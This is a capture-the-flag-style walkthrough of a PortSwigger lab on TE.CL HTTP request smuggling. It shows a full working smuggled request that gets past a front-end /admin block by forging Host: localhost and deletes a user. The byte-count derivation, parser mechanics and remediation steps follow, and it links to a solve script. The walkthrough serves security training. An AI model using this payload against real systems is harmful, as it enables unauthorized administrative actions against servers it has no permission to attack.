# Lab 7: Exploiting HTTP request smuggling to bypass front-end security controls (TE.CL)

**Category:** HTTP Request Smuggling
**Difficulty:** Practitioner
**Lab link:** [Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl)

## Overview

Mirror of Lab 6. Same bypass pattern (front-end blocks `/admin`, back-end allows it with `Host: localhost`), different smuggling direction (TE.CL — front-end TE, back-end CL). The smuggled request lives inside a chunk instead of after the chunked terminator.

## Key Concepts

- **Same bypass as Lab 6**, independent of CL.TE vs TE.CL mechanics. The front-end's `/admin` block and the back-end's `Host: localhost` trust are both bypassable through either smuggling direction.
- **TE.CL smuggling** puts the entire smuggled request inside a chunk of size `87` (hex) = 135 bytes.
- **Smuggled `Content-Length: 15`** eats bytes from the next request to make pipelining deterministic.

## Burp Setup

- Repeater → Inspector → HTTP/1.
- Repeater menu → uncheck **Update Content-Length**.
- Body ends with `0\r\n\r\n` (hex: `30 0D 0A 0D 0A`).

## Solution

Send twice:

```http
POST / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

Second response → carlos deleted → lab solved.

## How It Chains

**Front-end (TE):** reads chunk size `87` (135 bytes), consumes the full smuggled `GET /admin/delete?...` request, reads `0` terminator, forwards.

**Back-end (CL: 4):** reads only `87\r\n`. Treats request as done. The complete smuggled request parks in the socket buffer.

**Second request:** back-end parses the leftover. Smuggled `Content-Length: 15` with `x=1` (3 bytes) consumes 12 more bytes from the next request's start, then processes `GET /admin/delete?username=carlos` with `Host: localhost` → carlos deleted.

## Byte Count (135 = 0x87)

```
GET /admin/delete?username=carlos HTTP/1.1\r\n      = 44
Host: localhost\r\n                                 = 17
Content-Type: application/x-www-form-urlencoded\r\n = 49
Content-Length: 15\r\n                              = 20
\r\n                                                = 2
x=1                                                 = 3
----
total                                               = 135 = 0x87
```

## Lab 6 vs Lab 7

| Dimension | Lab 6 (CL.TE) | Lab 7 (TE.CL) |
|-----------|---------------|---------------|
| Front-end | `Content-Length: 139` | `Transfer-Encoding: chunked` |
| Back-end | `Transfer-Encoding` | `Content-Length: 4` |
| Smuggled position | After `0\r\n\r\n` terminator | Inside a chunk |
| Chunk size | n/a | `87` (135) |
| Smuggled body | `x=` (`CL: 10`) | `x=1` (`CL: 15`) |
| Impact | Delete carlos | Delete carlos |

Same attacker goal through two different parser-disagreement paths.

## Why It Worked

Same as Lab 6:

- Front-end can't apply its `/admin` block to bytes it doesn't parse.
- Back-end's `Host: localhost` trust assumes the Host comes from a legitimate internal caller — but a smuggled request can set any Host.
- Only one parser needs to disagree with the other for the bypass to work; the direction of disagreement (CL.TE vs TE.CL) doesn't change the exploit's impact.

## Remediation

Same as Lab 6:

- Reject requests with both `Content-Length` and `Transfer-Encoding`.
- Do access control at the back-end, not just the front-end.
- Don't trust `Host: localhost` for authorization.
- Normalize headers at the front-end.
- Use HTTP/2 end-to-end.

## Python Script

[solve.py on GitHub](https://github.com/codingvedant/burpsuite-academy-labs/blob/main/request-smuggling/lab-07-bypass-front-end-controls-te-cl/solve.py)

Raw TLS sockets. Script asserts the smuggled chunk is exactly 0x87 bytes.

## Key Takeaways

- **Bypass works in both directions.** CL.TE and TE.CL have different payload shapes but the same attacker outcome.
- **Chunk size `87` (135 bytes) is byte-exact** — any change (host length, extra header) requires recalculating.
- **Smuggled `Content-Length` on the inner request** controls how pipelining ends — reusable gadget.
- **Internal-trust markers (`Host: localhost`, internal IPs, custom headers) are forgeable via smuggling.** This lab + Lab 6 together prove the pattern against both desync directions.
